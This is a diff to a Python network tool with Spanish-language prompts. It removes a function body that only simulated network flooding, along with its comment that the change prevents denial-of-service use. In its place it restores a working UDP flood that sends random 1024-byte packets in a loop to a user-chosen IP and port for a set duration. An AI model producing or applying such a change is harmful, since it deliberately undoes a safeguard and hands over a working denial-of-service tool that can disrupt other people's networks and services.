@@ -701,12 +701,8 @@ def get_ip_from_link():
             process.wait()
         sys.exit(0)
 
-# ==== Atención: por seguridad la función network_flood se transforma en una SIMULACIÓN =====
+# ====Flood=====
 def network_flood():
-    """
-    SIMULACIÓN de inundación de red: mantiene la misma interfaz y prompts que la versión
-    original pero no envía paquetes. Esto evita facilitar ataques de denegación de servicio.
-    """
     target = input(f"{AZUL}[*] Ingresa la IP, el puerto y la duración (ej. 192.168.1.1:80:60): {RESET}")
     try:
         ip_port_duration = target.split(':')
@@ -720,12 +716,23 @@ def network_flood():
         print(f"{ROJO}[!] Formato incorrecto para el puerto o la duración. Deben ser números enteros.{RESET}")
         return
 
-    print(f"\n{AZUL}[*] MODO SIMULACIÓN: no se enviarán paquetes reales.{RESET}")
-    pps = 1000
-    total = pps * duration
-    print(f"{VERDE}SIMULACIÓN:{RESET} objetivo={ip}, puerto={port}, duración={duration}s")
-    print(f"{VERDE}Estimación:{RESET} ~{total} paquetes a ~{pps} pps.")
-    print(f"{BLANCO}Nota:{RESET} Para pruebas legítimas de carga, usa herramientas diseñadas para testing (p.ej. iperf3, tcpreplay) en un entorno controlado y con permiso.")
+    print(f"\n[*] Iniciando inundación UDP a {ip}:{port} durante {duration} segundos...")
+    packet_count = 0
+    start_time = time.time()
+    
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        packet = random._urandom(1024)
+        while time.time() < start_time + duration:
+            s.sendto(packet, (ip, port))
+            packet_count += 1
+        s.close()
+    except socket.gaierror:
+        print(f"\n{ROJO}[!] ERROR: Dirección o nombre de host inválido.{RESET}")
+    except Exception as e:
+        print(f"\n{ROJO}[!] ERROR: Ocurrió un error inesperado: {e}{RESET}")
+    finally:
+        print(f"\n[+] Inundación finalizada. Paquetes enviados: {packet_count}")# 
 # ========================================================================================
 
 def get_website_info():
